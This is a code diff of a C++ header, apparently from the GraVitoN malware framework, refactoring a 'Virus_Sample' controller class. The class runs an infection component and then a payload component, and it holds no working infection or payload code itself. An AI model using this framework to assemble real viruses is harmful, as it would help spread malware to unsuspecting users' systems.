@@ -26,65 +26,59 @@
 #ifndef _GVN_AI_VIRUS_SAMPLE_HEAD_
 #define _GVN_AI_VIRUS_SAMPLE_HEAD_
 
-#include "gvn_ai.hpp"
-#include "../gvn_spread/gvn_spread.hpp"
-#include "../gvn_payload/gvn_payload.hpp"
-using namespace GraVitoN;
+#include <ai/ai.hpp>
+#include <infect/infect.hpp>
+#include <payload/payload.hpp>
+
+namespace GraVitoN
+{
+
+namespace AI
+{
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
   * @brief A Very Simple AI component for a virus
   * @see AI_Trojan_Sample
   */
-class AI_Virus_Sample : public GraVitoN::AI
+class Virus_Sample : public AI::AI_Component
 {
 protected:
-	Payload *payload;
-	Spread *spread;
-
-protected:
-	/**
-	  * @brief Initialize internal components
-	  */
-	virtual bool initializeInternalComponents();
+    Payload::Payload_Component &payload;
+    Infect::Infect_Component &infect;
 
 public:
-    AI_Virus_Sample();
-	virtual ~AI_Virus_Sample();
+    Virus_Sample(Payload::Payload_Component &_payload, Infect::Infect_Component &_infect);
+
+    virtual ~Virus_Sample();
 
 	virtual bool run();
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-AI_Virus_Sample::AI_Virus_Sample()
-{
-    payload = _null_;
-	spread = _null_;
-}
-
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-AI_Virus_Sample::~AI_Virus_Sample()
+Virus_Sample::Virus_Sample (Payload::Payload_Component &_payload, Infect::Infect_Component &_infect):
+    payload(_payload),
+    infect(_infect)
 {
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool AI_Virus_Sample::initializeInternalComponents()
+Virus_Sample::~Virus_Sample()
 {
-	Logger::logItLn("[AI_Virus_Sample::initializeInternalComponents] YOU HAVE TO OVERRIDE ME!");
-
-	return false;
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool AI_Virus_Sample::run()
+bool Virus_Sample::run()
 {
 	bool suc = true;
-	if( !(spread)->run() )
+    if( !infect.run() )
 		suc = false;
-	if( !(payload)->run() )
+    if( !payload.run() )
 		suc = false;
 	
     return suc;
 }
 
+}
+}
 #endif // _GVN_AI_VIRUS_SAMPLE_HEAD_
